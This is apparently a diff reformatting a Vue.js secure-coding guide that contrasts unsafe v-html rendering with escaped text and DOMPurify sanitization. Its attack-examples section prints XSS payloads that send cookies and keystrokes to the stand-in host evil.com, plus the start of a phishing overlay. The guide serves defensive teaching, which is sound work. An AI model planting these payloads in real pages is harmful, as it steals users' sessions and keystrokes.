@@ -21,7 +21,6 @@ The `v-html` directive renders raw HTML without sanitization. While useful for t
 - [ ] Audit existing `v-html` usage for potential XSS vectors
 
 **Incorrect:**
-
 ```vue
 <template>
   <!-- DANGEROUS: User input rendered as HTML -->
@@ -43,7 +42,6 @@ const userComment = ref(props.comment)
 ```
 
 **Correct:**
-
 ```vue
 <template>
   <!-- SAFE: Text interpolation escapes HTML -->
@@ -57,16 +55,18 @@ const userComment = ref(props.comment)
 </template>
 
 <script setup>
-  import { computed } from 'vue'
-  import DOMPurify from 'dompurify'
+import { computed } from 'vue'
+import DOMPurify from 'dompurify'
 
-  const props = defineProps(['comment', 'trustedHtml'])
+const props = defineProps(['comment', 'trustedHtml'])
 
-  // Option 1: Use text interpolation (recommended)
-  const userComment = computed(() => props.comment)
+// Option 1: Use text interpolation (recommended)
+const userComment = computed(() => props.comment)
 
-  // Option 2: Sanitize if raw HTML is truly needed
-  const sanitizedContent = computed(() => DOMPurify.sanitize(props.trustedHtml))
+// Option 2: Sanitize if raw HTML is truly needed
+const sanitizedContent = computed(() =>
+  DOMPurify.sanitize(props.trustedHtml)
+)
 </script>
 ```
 
@@ -82,8 +82,8 @@ const userComment = ref(props.comment)
 </template>
 
 <script setup>
-  // Content you control, not user input
-  const staticLegalDisclaimer = `
+// Content you control, not user input
+const staticLegalDisclaimer = `
   <p>Terms and conditions apply.</p>
   <a href="/legal">Read more</a>
 `
@@ -93,17 +93,12 @@ const userComment = ref(props.comment)
 ## XSS Attack Examples
 
 Attackers can inject various payloads:
-
 ```html
 <!-- Cookie theft -->
-<img src="x" onerror="fetch('https://evil.com?c='+document.cookie)" />
+<img src="x" onerror="fetch('https://evil.com?c='+document.cookie)">
 
 <!-- Keylogging -->
-<script>
-  document.onkeypress = function (e) {
-    fetch('https://evil.com?k=' + e.key)
-  }
-</script>
+<script>document.onkeypress=function(e){fetch('https://evil.com?k='+e.key)}</script>
 
 <!-- Phishing overlay -->
 <div style="position:fixed;top:0;left:0;width:100%;height:100%">
@@ -112,6 +107,5 @@ Attackers can inject various payloads:
 ```
 
 ## Reference
-
 - [Vue.js Template Syntax - Raw HTML](https://vuejs.org/guide/essentials/template-syntax.html#raw-html)
 - [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
